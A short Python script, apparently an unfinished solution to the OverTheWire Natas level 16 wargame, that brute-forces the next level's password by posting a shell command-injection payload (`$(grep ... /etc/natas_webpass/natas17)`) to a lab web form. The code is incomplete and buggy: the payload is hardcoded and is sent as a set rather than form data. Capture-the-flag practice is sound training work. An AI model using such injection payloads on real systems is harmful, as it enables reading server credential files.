import requests
import re
import string



wordlist = string.printable


username = 'natas16'
password = ''
url = 'http://%s.natas.labs.overthewire.org' % username

session = requests.Session()
#response = session.get(url, auth = (username, password))
#print(response.text)



# to do: 

extracted_password = list()

for i in range(1,33):
    for w in wordlist:
        print("Testing with: ", "".join(extracted_password) + w)
        response = session.post(url, data = {'$(grep -E ^b /etc/natas_webpass/natas17)Something'}, auth = (username, password))
    #    response = session.post(url, data = {'$()'})
        content = response.text

        if ('<pre> </pre>' in content ):
            extracted_password.append(w)
            break
        
